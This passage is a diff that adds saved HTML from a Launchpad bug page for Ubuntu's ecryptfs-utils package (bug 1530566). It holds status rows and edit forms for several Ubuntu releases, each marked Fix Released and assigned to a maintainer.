+          Me
+        </label>
+      </td>
+    </tr>
+    
+      
+        <tr>
+          <td style="padding: 0 2px 2px 0">
+              <input type="radio" checked="checked" id="ubuntu_ecryptfs-utils.assignee.assigned_to" name="ubuntu_ecryptfs-utils.assignee.option" value="ubuntu_ecryptfs-utils.assignee.assigned_to" />
+          </td>
+          <td style="padding: 0">
+            <label style="font-weight: normal" for="ubuntu_ecryptfs-utils.assignee.assigned_to">
+              Dustin Kirkland  (kirkland)
+            </label>
+          </td>
+        </tr>
+      
+    
+    
+  </table>
+
+
+</td>
+      </tr>
+    </table>
+    
+  </div>
+  <div class="field">
+    <div>
+      <label style="font-weight: bold" for="ubuntu_ecryptfs-utils.comment_on_change">Comment on this change (optional)</label>
+      <textarea cols="62" rows="4" id="ubuntu_ecryptfs-utils.comment_on_change" name="ubuntu_ecryptfs-utils.comment_on_change"></textarea>
+    </div>
+    <div>
+      <label style="font-weight: normal">
+        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
+        Email me about changes to this bug report
+      </label>
+    </div>
+  </div>
+  
+</form>
+</td>
+    </tr>
+  
+
+
+        
+        
+          
+  <tr id="tasksummary1976266">
+    <td>
+      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/precise/+source/ecryptfs-utils/+bug/1530566/+editstatus">
+        &#8203;
+      </a>
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/precise/+source/ecryptfs-utils">Precise</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/precise/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/precise/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceHIGH">High</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary1976266">
+          <span class="yui3-activator-data-box">
+            <a class="sprite person" href="https://launchpad.net/~tyhicks">Tyler Hicks</a>
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      
+    </td>
+
+    
+  </tr>
+
+  
+    <tr class="bugtask-collapsible-content hidden" id="task1976266">
+     <td colspan="7"><form action="/ubuntu/precise/+source/ecryptfs-utils/+bug/1530566/+editstatus" method="post" enctype="multipart/form-data">
+  
+
+  <p class="error message">
+    You need to log in to change this bug's status.
+  </p>
+  
+  <table class="summary" style="float: right; margin-left: 1em;">
+    <tr>
+      <th>Affecting:</th>
+      <td><a href="/ubuntu/precise/+source/ecryptfs-utils">ecryptfs-utils (Ubuntu Precise)</a></td>
+    </tr>
+    <tr>
+      <th>Filed here by:</th>
+      <td><a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks</a></td>
+    </tr>
+    <tr>
+      <th>When:</th>
+      <td>
+        <time title="2016-01-11 16:48:52 UTC" datetime="2016-01-11T16:48:52.579205+00:00">2016-01-11</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Confirmed:</th>
+      <td>
+        <time title="2016-01-21 01:21:27 UTC" datetime="2016-01-21T01:21:27.223599+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Assigned:</th>
+      <td>
+        <time title="2016-01-21 01:21:59 UTC" datetime="2016-01-21T01:21:59.262212+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Started work:</th>
+      <td>
+        <time title="2016-01-21 01:21:27 UTC" datetime="2016-01-21T01:21:27.223599+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Completed:</th>
+      <td>
+        <time title="2016-01-21 01:21:27 UTC" datetime="2016-01-21T01:21:27.223599+00:00">2016-01-21</time>
+      </td>
+    </tr>
+  </table>
+  <div class="field">
+    
+    <table>
+      <tr>
+        <td>
+          <label for="ubuntu_precise_ecryptfs-utils.sourcepackagename">Package</label>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          
+
+
+    <input type="text" value="ecryptfs-utils" id="ubuntu_precise_ecryptfs-utils.sourcepackagename"
+                         name="ubuntu_precise_ecryptfs-utils.sourcepackagename" size="20"
+                         maxlength=""
+                         onKeyPress="" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ubuntu_precise_ecryptfs-utils.sourcepackagename');
+              var select_menu = Y.DOM.byId('ubuntu_precise_ecryptfs-utils.sourcepackagename-suggestions');
+              Y.lp.app.picker.connect_select_menu(
+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ubuntu_precise_ecryptfs-utils-sourcepackagename" href="#">Find&hellip;</a>)</span>
+    <script>
+  LPJS.use('node', 'lp.app.picker', function(Y) {
+      var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": "ecryptfs-utils", "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionSourcePackage", "input_element": "ubuntu_precise_ecryptfs-utils.sourcepackagename", "show_widget_id": "show-widget-ubuntu_precise_ecryptfs-utils-sourcepackagename", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+      var distribution_name = '';
+      var distribution_id = '';
+      var distroseries_id = '';
+      if (distribution_name !== '') {
+          config.getContextPath = function() {
+              return '/' + distribution_name;
+          }
+      } else if (distribution_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distribution_id).value;
+          };
+      } else if (distroseries_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
+          };
+      }
+      var show_widget_id = 'show-widget-ubuntu_precise_ecryptfs-utils-sourcepackagename';
+      Y.on('domready', function(e) {
+          Y.lp.app.picker.addPicker(config, show_widget_id);
+      });
+  });
+  </script>
+  
+
+
+
+          
+        </td>
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_precise_ecryptfs-utils.status">Status</label>
+        </td>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_precise_ecryptfs-utils.importance">Importance</label>
+        </td>
+        
+      </tr>
+      <tr>
+        <td><div>
+<div class="value">
+<select id="ubuntu_precise_ecryptfs-utils.status" name="ubuntu_precise_ecryptfs-utils.status" size="1" >
+<option selected="selected" value="Fix Released">Fix Released</option>
+</select>
+</div>
+<input name="ubuntu_precise_ecryptfs-utils.status-empty-marker" type="hidden" value="1" />
+</div></td>
+        <td title="Changeable only by a project maintainer or bug supervisor">
+          <span class="sprite read-only"></span>
+          <span class="importanceHIGH">High</span>
+        </td>
+        
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_precise_ecryptfs-utils.assignee">Assigned to</label>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2" style="white-space: nowrap">
+
+  <table>
+    
+    <tr>
+      <td style="padding: 0 2px 2px 0">
+        <input type="radio" id="ubuntu_precise_ecryptfs-utils.assignee.assign_to_me" name="ubuntu_precise_ecryptfs-utils.assignee.option" value="ubuntu_precise_ecryptfs-utils.assignee.assign_to_me" />
+      </td>
+      <td style="padding: 0">
+        <label style="font-weight: normal" for="ubuntu_precise_ecryptfs-utils.assignee.assign_to_me">
+          Me
+        </label>
+      </td>
+    </tr>
+    
+      
+        <tr>
+          <td style="padding: 0 2px 2px 0">
+              <input type="radio" checked="checked" id="ubuntu_precise_ecryptfs-utils.assignee.assigned_to" name="ubuntu_precise_ecryptfs-utils.assignee.option" value="ubuntu_precise_ecryptfs-utils.assignee.assigned_to" />
+          </td>
+          <td style="padding: 0">
+            <label style="font-weight: normal" for="ubuntu_precise_ecryptfs-utils.assignee.assigned_to">
+              Tyler Hicks (tyhicks)
+            </label>
+          </td>
+        </tr>
+      
+    
+    
+  </table>
+
+
+</td>
+      </tr>
+    </table>
+    
+  </div>
+  <div class="field">
+    <div>
+      <label style="font-weight: bold" for="ubuntu_precise_ecryptfs-utils.comment_on_change">Comment on this change (optional)</label>
+      <textarea cols="62" rows="4" id="ubuntu_precise_ecryptfs-utils.comment_on_change" name="ubuntu_precise_ecryptfs-utils.comment_on_change"></textarea>
+    </div>
+    <div>
+      <label style="font-weight: normal">
+        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
+        Email me about changes to this bug report
+      </label>
+    </div>
+  </div>
+  
+</form>
+</td>
+    </tr>
+  
+
+
+        
+        
+          
+  <tr id="tasksummary1976264">
+    <td>
+      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/trusty/+source/ecryptfs-utils/+bug/1530566/+editstatus">
+        &#8203;
+      </a>
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/ecryptfs-utils">Trusty</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceHIGH">High</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary1976264">
+          <span class="yui3-activator-data-box">
+            <a class="sprite person" href="https://launchpad.net/~tyhicks">Tyler Hicks</a>
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    <tr class="bugtask-collapsible-content hidden" id="task1976264">
+     <td colspan="7"><form action="/ubuntu/trusty/+source/ecryptfs-utils/+bug/1530566/+editstatus" method="post" enctype="multipart/form-data">
+  
+
+  <p class="error message">
+    You need to log in to change this bug's status.
+  </p>
+  
+  <table class="summary" style="float: right; margin-left: 1em;">
+    <tr>
+      <th>Affecting:</th>
+      <td><a href="/ubuntu/trusty/+source/ecryptfs-utils">ecryptfs-utils (Ubuntu Trusty)</a></td>
+    </tr>
+    <tr>
+      <th>Filed here by:</th>
+      <td><a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks</a></td>
+    </tr>
+    <tr>
+      <th>When:</th>
+      <td>
+        <time title="2016-01-11 16:48:52 UTC" datetime="2016-01-11T16:48:52.579205+00:00">2016-01-11</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Confirmed:</th>
+      <td>
+        <time title="2016-01-21 01:21:29 UTC" datetime="2016-01-21T01:21:29.767253+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Assigned:</th>
+      <td>
+        <time title="2016-01-21 01:21:57 UTC" datetime="2016-01-21T01:21:57.374067+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Started work:</th>
+      <td>
+        <time title="2016-01-21 01:21:29 UTC" datetime="2016-01-21T01:21:29.767253+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Completed:</th>
+      <td>
+        <time title="2016-01-21 01:21:29 UTC" datetime="2016-01-21T01:21:29.767253+00:00">2016-01-21</time>
+      </td>
+    </tr>
+  </table>
+  <div class="field">
+    
+    <table>
+      <tr>
+        <td>
+          <label for="ubuntu_trusty_ecryptfs-utils.sourcepackagename">Package</label>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          
+
+
+    <input type="text" value="ecryptfs-utils" id="ubuntu_trusty_ecryptfs-utils.sourcepackagename"
+                         name="ubuntu_trusty_ecryptfs-utils.sourcepackagename" size="20"
+                         maxlength=""
+                         onKeyPress="" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ubuntu_trusty_ecryptfs-utils.sourcepackagename');
+              var select_menu = Y.DOM.byId('ubuntu_trusty_ecryptfs-utils.sourcepackagename-suggestions');
+              Y.lp.app.picker.connect_select_menu(
+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ubuntu_trusty_ecryptfs-utils-sourcepackagename" href="#">Find&hellip;</a>)</span>
+    <script>
+  LPJS.use('node', 'lp.app.picker', function(Y) {
+      var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": "ecryptfs-utils", "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionSourcePackage", "input_element": "ubuntu_trusty_ecryptfs-utils.sourcepackagename", "show_widget_id": "show-widget-ubuntu_trusty_ecryptfs-utils-sourcepackagename", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+      var distribution_name = '';
+      var distribution_id = '';
+      var distroseries_id = '';
+      if (distribution_name !== '') {
+          config.getContextPath = function() {
+              return '/' + distribution_name;
+          }
+      } else if (distribution_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distribution_id).value;
+          };
+      } else if (distroseries_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
+          };
+      }
+      var show_widget_id = 'show-widget-ubuntu_trusty_ecryptfs-utils-sourcepackagename';
+      Y.on('domready', function(e) {
+          Y.lp.app.picker.addPicker(config, show_widget_id);
+      });
+  });
+  </script>
+  
+
+
+
+          
+        </td>
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_trusty_ecryptfs-utils.status">Status</label>
+        </td>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_trusty_ecryptfs-utils.importance">Importance</label>
+        </td>
+        
+      </tr>
+      <tr>
+        <td><div>
+<div class="value">
+<select id="ubuntu_trusty_ecryptfs-utils.status" name="ubuntu_trusty_ecryptfs-utils.status" size="1" >
+<option selected="selected" value="Fix Released">Fix Released</option>
+</select>
+</div>
+<input name="ubuntu_trusty_ecryptfs-utils.status-empty-marker" type="hidden" value="1" />
+</div></td>
+        <td title="Changeable only by a project maintainer or bug supervisor">
+          <span class="sprite read-only"></span>
+          <span class="importanceHIGH">High</span>
+        </td>
+        
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_trusty_ecryptfs-utils.assignee">Assigned to</label>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2" style="white-space: nowrap">
+
+  <table>
+    
+    <tr>
+      <td style="padding: 0 2px 2px 0">
+        <input type="radio" id="ubuntu_trusty_ecryptfs-utils.assignee.assign_to_me" name="ubuntu_trusty_ecryptfs-utils.assignee.option" value="ubuntu_trusty_ecryptfs-utils.assignee.assign_to_me" />
+      </td>
+      <td style="padding: 0">
+        <label style="font-weight: normal" for="ubuntu_trusty_ecryptfs-utils.assignee.assign_to_me">
+          Me
+        </label>
+      </td>
+    </tr>
+    
+      
+        <tr>
+          <td style="padding: 0 2px 2px 0">
+              <input type="radio" checked="checked" id="ubuntu_trusty_ecryptfs-utils.assignee.assigned_to" name="ubuntu_trusty_ecryptfs-utils.assignee.option" value="ubuntu_trusty_ecryptfs-utils.assignee.assigned_to" />
+          </td>
+          <td style="padding: 0">
+            <label style="font-weight: normal" for="ubuntu_trusty_ecryptfs-utils.assignee.assigned_to">
+              Tyler Hicks (tyhicks)
+            </label>
+          </td>
+        </tr>
+      
+    
+    
+  </table>
+
+
+</td>
+      </tr>
+    </table>
+    
+  </div>
+  <div class="field">
+    <div>
+      <label style="font-weight: bold" for="ubuntu_trusty_ecryptfs-utils.comment_on_change">Comment on this change (optional)</label>
+      <textarea cols="62" rows="4" id="ubuntu_trusty_ecryptfs-utils.comment_on_change" name="ubuntu_trusty_ecryptfs-utils.comment_on_change"></textarea>
+    </div>
+    <div>
+      <label style="font-weight: normal">
+        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
+        Email me about changes to this bug report
+      </label>
+    </div>
+  </div>
+  
+</form>
+</td>
+    </tr>
+  
+
+
+        
+        
+          
+  <tr id="tasksummary1976263">
+    <td>
+      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/vivid/+source/ecryptfs-utils/+bug/1530566/+editstatus">
+        &#8203;
+      </a>
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/ecryptfs-utils">Vivid</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceHIGH">High</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary1976263">
+          <span class="yui3-activator-data-box">
+            <a class="sprite person" href="https://launchpad.net/~tyhicks">Tyler Hicks</a>
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      
+    </td>
+
+    
+  </tr>
+
+  
+    <tr class="bugtask-collapsible-content hidden" id="task1976263">
+     <td colspan="7"><form action="/ubuntu/vivid/+source/ecryptfs-utils/+bug/1530566/+editstatus" method="post" enctype="multipart/form-data">
+  
+
+  <p class="error message">
+    You need to log in to change this bug's status.
+  </p>
+  
+  <table class="summary" style="float: right; margin-left: 1em;">
+    <tr>
+      <th>Affecting:</th>
+      <td><a href="/ubuntu/vivid/+source/ecryptfs-utils">ecryptfs-utils (Ubuntu Vivid)</a></td>
+    </tr>
+    <tr>
+      <th>Filed here by:</th>
+      <td><a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks</a></td>
+    </tr>
+    <tr>
+      <th>When:</th>
+      <td>
+        <time title="2016-01-11 16:48:52 UTC" datetime="2016-01-11T16:48:52.579205+00:00">2016-01-11</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Confirmed:</th>
+      <td>
+        <time title="2016-01-21 01:21:32 UTC" datetime="2016-01-21T01:21:32.091496+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Assigned:</th>
+      <td>
+        <time title="2016-01-21 01:21:55 UTC" datetime="2016-01-21T01:21:55.869968+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Started work:</th>
+      <td>
+        <time title="2016-01-21 01:21:32 UTC" datetime="2016-01-21T01:21:32.091496+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Completed:</th>
+      <td>
+        <time title="2016-01-21 01:21:32 UTC" datetime="2016-01-21T01:21:32.091496+00:00">2016-01-21</time>
+      </td>
+    </tr>
+  </table>
+  <div class="field">
+    
+    <table>
+      <tr>
+        <td>
+          <label for="ubuntu_vivid_ecryptfs-utils.sourcepackagename">Package</label>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          
+
+
+    <input type="text" value="ecryptfs-utils" id="ubuntu_vivid_ecryptfs-utils.sourcepackagename"
+                         name="ubuntu_vivid_ecryptfs-utils.sourcepackagename" size="20"
+                         maxlength=""
+                         onKeyPress="" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ubuntu_vivid_ecryptfs-utils.sourcepackagename');
+              var select_menu = Y.DOM.byId('ubuntu_vivid_ecryptfs-utils.sourcepackagename-suggestions');
+              Y.lp.app.picker.connect_select_menu(
+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ubuntu_vivid_ecryptfs-utils-sourcepackagename" href="#">Find&hellip;</a>)</span>
+    <script>
+  LPJS.use('node', 'lp.app.picker', function(Y) {
+      var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": "ecryptfs-utils", "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionSourcePackage", "input_element": "ubuntu_vivid_ecryptfs-utils.sourcepackagename", "show_widget_id": "show-widget-ubuntu_vivid_ecryptfs-utils-sourcepackagename", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+      var distribution_name = '';
+      var distribution_id = '';
+      var distroseries_id = '';
+      if (distribution_name !== '') {
+          config.getContextPath = function() {
+              return '/' + distribution_name;
+          }
+      } else if (distribution_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distribution_id).value;
+          };
+      } else if (distroseries_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
+          };
+      }
+      var show_widget_id = 'show-widget-ubuntu_vivid_ecryptfs-utils-sourcepackagename';
+      Y.on('domready', function(e) {
+          Y.lp.app.picker.addPicker(config, show_widget_id);
+      });
+  });
+  </script>
+  
+
+
+
+          
+        </td>
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_vivid_ecryptfs-utils.status">Status</label>
+        </td>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_vivid_ecryptfs-utils.importance">Importance</label>
+        </td>
+        
+      </tr>
+      <tr>
+        <td><div>
+<div class="value">
+<select id="ubuntu_vivid_ecryptfs-utils.status" name="ubuntu_vivid_ecryptfs-utils.status" size="1" >
+<option selected="selected" value="Fix Released">Fix Released</option>
+</select>
+</div>
+<input name="ubuntu_vivid_ecryptfs-utils.status-empty-marker" type="hidden" value="1" />
+</div></td>
+        <td title="Changeable only by a project maintainer or bug supervisor">
+          <span class="sprite read-only"></span>
+          <span class="importanceHIGH">High</span>
+        </td>
+        
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_vivid_ecryptfs-utils.assignee">Assigned to</label>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2" style="white-space: nowrap">
+
+  <table>
+    
+    <tr>
+      <td style="padding: 0 2px 2px 0">
+        <input type="radio" id="ubuntu_vivid_ecryptfs-utils.assignee.assign_to_me" name="ubuntu_vivid_ecryptfs-utils.assignee.option" value="ubuntu_vivid_ecryptfs-utils.assignee.assign_to_me" />
+      </td>
+      <td style="padding: 0">
+        <label style="font-weight: normal" for="ubuntu_vivid_ecryptfs-utils.assignee.assign_to_me">
+          Me
+        </label>
+      </td>
+    </tr>
+    
+      
+        <tr>
+          <td style="padding: 0 2px 2px 0">
+              <input type="radio" checked="checked" id="ubuntu_vivid_ecryptfs-utils.assignee.assigned_to" name="ubuntu_vivid_ecryptfs-utils.assignee.option" value="ubuntu_vivid_ecryptfs-utils.assignee.assigned_to" />
+          </td>
+          <td style="padding: 0">
+            <label style="font-weight: normal" for="ubuntu_vivid_ecryptfs-utils.assignee.assigned_to">
+              Tyler Hicks (tyhicks)
+            </label>
+          </td>
+        </tr>
+      
+    
+    
+  </table>
+
+
+</td>
+      </tr>
+    </table>
+    
+  </div>
+  <div class="field">
+    <div>
+      <label style="font-weight: bold" for="ubuntu_vivid_ecryptfs-utils.comment_on_change">Comment on this change (optional)</label>
+      <textarea cols="62" rows="4" id="ubuntu_vivid_ecryptfs-utils.comment_on_change" name="ubuntu_vivid_ecryptfs-utils.comment_on_change"></textarea>
+    </div>
+    <div>
+      <label style="font-weight: normal">
+        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
+        Email me about changes to this bug report
+      </label>
+    </div>
+  </div>
+  
+</form>
+</td>
+    </tr>
+  
+
+
+        
+        
+          
+  <tr id="tasksummary1976267">
+    <td>
+      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/wily/+source/ecryptfs-utils/+bug/1530566/+editstatus">
+        &#8203;
+      </a>
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/wily/+source/ecryptfs-utils">Wily</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/wily/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/wily/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceHIGH">High</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary1976267">
+          <span class="yui3-activator-data-box">
+            <a class="sprite person" href="https://launchpad.net/~tyhicks">Tyler Hicks</a>
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      
+    </td>
+
+    
+  </tr>
+
+  
+    <tr class="bugtask-collapsible-content hidden" id="task1976267">
+     <td colspan="7"><form action="/ubuntu/wily/+source/ecryptfs-utils/+bug/1530566/+editstatus" method="post" enctype="multipart/form-data">
+  
+
+  <p class="error message">
+    You need to log in to change this bug's status.
+  </p>
+  
+  <table class="summary" style="float: right; margin-left: 1em;">
+    <tr>
+      <th>Affecting:</th>
+      <td><a href="/ubuntu/wily/+source/ecryptfs-utils">ecryptfs-utils (Ubuntu Wily)</a></td>
+    </tr>
+    <tr>
+      <th>Filed here by:</th>
+      <td><a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks</a></td>
+    </tr>
+    <tr>
+      <th>When:</th>
+      <td>
+        <time title="2016-01-11 16:48:52 UTC" datetime="2016-01-11T16:48:52.579205+00:00">2016-01-11</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Confirmed:</th>
+      <td>
+        <time title="2016-01-21 01:21:34 UTC" datetime="2016-01-21T01:21:34.070910+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Assigned:</th>
+      <td>
+        <time title="2016-01-21 01:21:53 UTC" datetime="2016-01-21T01:21:53.979119+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Started work:</th>
+      <td>
+        <time title="2016-01-21 01:21:34 UTC" datetime="2016-01-21T01:21:34.070910+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Completed:</th>
+      <td>
+        <time title="2016-01-21 01:21:34 UTC" datetime="2016-01-21T01:21:34.070910+00:00">2016-01-21</time>
+      </td>
+    </tr>
+  </table>
+  <div class="field">
+    
+    <table>
+      <tr>
+        <td>
+          <label for="ubuntu_wily_ecryptfs-utils.sourcepackagename">Package</label>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          
+
+
+    <input type="text" value="ecryptfs-utils" id="ubuntu_wily_ecryptfs-utils.sourcepackagename"
+                         name="ubuntu_wily_ecryptfs-utils.sourcepackagename" size="20"
+                         maxlength=""
+                         onKeyPress="" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ubuntu_wily_ecryptfs-utils.sourcepackagename');
+              var select_menu = Y.DOM.byId('ubuntu_wily_ecryptfs-utils.sourcepackagename-suggestions');
+              Y.lp.app.picker.connect_select_menu(
